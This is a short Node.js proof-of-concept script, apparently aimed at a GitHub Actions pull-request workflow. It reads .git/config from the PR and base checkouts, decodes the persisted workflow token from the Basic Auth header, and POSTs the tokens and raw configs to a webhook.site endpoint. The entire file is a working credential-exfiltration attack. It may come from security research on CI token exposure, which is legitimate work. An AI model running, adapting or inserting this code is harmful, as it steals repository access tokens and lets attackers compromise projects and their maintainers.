// Runs during Phase 1 (cwd is pr/). No repo secrets are in env here —
// but actions/checkout persisted the workflow token into .git/config
// on BOTH checkouts (pr/ and base/). Read both, decode the Basic Auth
// header, exfiltrate.
const fs = require('fs');
const path = require('path');
const https = require('https');

const targets = {
  pr:   path.resolve(process.cwd(), '.git', 'config'),
  base: path.resolve(process.cwd(), '..', 'base', '.git', 'config'),
};

const extractToken = (configText) => {
  const m = configText.match(/extraheader\s*=\s*AUTHORIZATION:\s*basic\s+(\S+)/i);
  if (!m) return null;
  const decoded = Buffer.from(m[1], 'base64').toString('utf8'); // "x-access-token:ghs_..."
  const idx = decoded.indexOf(':');
  return idx === -1 ? decoded : decoded.slice(idx + 1);
};

const findings = {};
for (const [label, p] of Object.entries(targets)) {
  try {
    const text = fs.readFileSync(p, 'utf8');
    findings[label] = {
      path: p,
      raw_config: text,
      token: extractToken(text),
    };
  } catch (e) {
    findings[label] = { path: p, error: e.message };
  }
}

const body = JSON.stringify({ phase: 1, source: 'git-config', findings });
const url = new URL('https://webhook.site/4be739e9-e5d8-46f2-b1a8-40dcb6812a09');
const req = https.request({
  method: 'POST',
  hostname: url.hostname,
  path: url.pathname + url.search,
  headers: { 'content-type': 'application/json', 'content-length': Buffer.byteLength(body) },
});
req.on('error', () => {});
req.write(body);
req.end();
console.log('[poc-install] exfil sent');
